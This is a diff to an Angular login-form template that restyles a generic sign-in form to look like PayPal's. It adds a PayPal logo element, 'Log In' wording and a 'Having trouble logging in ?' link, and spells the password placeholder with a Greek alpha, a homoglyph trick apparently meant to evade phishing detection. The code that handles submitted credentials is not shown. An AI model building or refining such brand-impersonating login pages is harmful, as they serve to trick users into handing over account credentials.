@@ -1,10 +1,10 @@
 <div class="login-form">
-    <h1>Sign in</h1>
     <form #loginForm="ngForm" (ngSubmit)="onSubmit(loginForm)">
+        <p class="paypal-logo paypal-logo-long"></p>
         <div class="form-group">
-            <div class="form-row">
+            
                 <input autocomplete="off" #email="ngModel" name="email" required [(ngModel)]="login.email" type="text"
-                 class="form-control my-input" [ngClass]="{'is-valid' :email.valid==true ,'is-invalid' :email.valid==false && email.touched }"
+                 class="form-control my-input is-invalid" [ngClass]="{'is-valid' :email.valid==true ,'is-invalid' :email.valid==false && email.touched }"
                     placeholder="Email or phone number">
                 <div [ngClass]="{'valid-feedback' :email.valid==true,'invalid-feedback' :email.valid==false }">
                     <div *ngIf="!email.valid && email.touched">
@@ -15,10 +15,11 @@
                     </div>
                    
                 </div>
-            </div>
+           
 
         </div>
         <div class="form-group">
+            
             <input minlength="4" autocomplete="off" #password="ngModel" name="password" required [(ngModel)]="login.password" type="password"
              class="form-control my-input is-invalid" [ngClass]="{'is-valid' :password.valid==true,'is-invalid' :password.valid==false && password.touched}"
                 placeholder="p&alpha;ssword">
@@ -34,14 +35,12 @@
         </div>
         <div class="form-group">
             <button type="submit" routerLinkActive="router-link-active" class="btn my-btn">
-                Sign in
+               Log In
             </button>
         </div>
-        <div class="form-check">
-            <input class="form-check-input" type="checkbox" id="autoSizingCheck2">
-            <label class="form-check-label remember-me-label" for="autoSizingCheck2">
-                Remember me
-            </label>
-        </div>
+        
+        <a href="#" class="trouble-loggin" style="display: flex; justify-content: center;">
+            Having trouble logging in ?
+        </a>
     </form>
 </div>
